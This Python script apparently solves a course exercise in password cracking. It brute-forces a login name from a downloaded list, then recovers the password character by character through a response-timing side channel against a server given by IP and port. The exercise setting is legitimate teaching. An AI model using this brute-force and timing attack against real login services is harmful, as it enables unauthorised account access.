# write your code here
import itertools
import socket
import sys
import urllib.request
import json
import datetime

def password_generator(length):
    for m in itertools.product(itertools.chain(range(65, 91), range(97, 123), range(48, 58)), repeat=length):
        yield ''.join(map(chr, iter(m)))

args = sys.argv
ip = args[1]
port = int(args[2])

with socket.socket() as client_socket:
    address = (ip, port)
    client_socket.connect(address)
    login = {"login": "", "password": ""}
    users = urllib.request.urlopen('https://stepik.org/media/attachments/lesson/255258/logins.txt')
    for user in users:
        login['login'] = user.decode().strip()
        client_socket.send(json.dumps(login).encode())
        response = client_socket.recv(1024)
        message = json.loads(response.decode())
        if message['result'] != 'Wrong login!':
            break

    password = ""
    run = True

    while run:
        for character in password_generator(1):
            login['password'] = password + character
            start = datetime.datetime.now()
            client_socket.send(json.dumps(login).encode())
            response = client_socket.recv(1024)
            finish = datetime.datetime.now()
            message = json.loads(response.decode())
            if message['result'] != 'Wrong password!' or \
                    finish - start > datetime.timedelta(seconds=1):
                password += character
                break

        if message['result'] == 'Connection success!':
            print(json.dumps(login))
            run = False

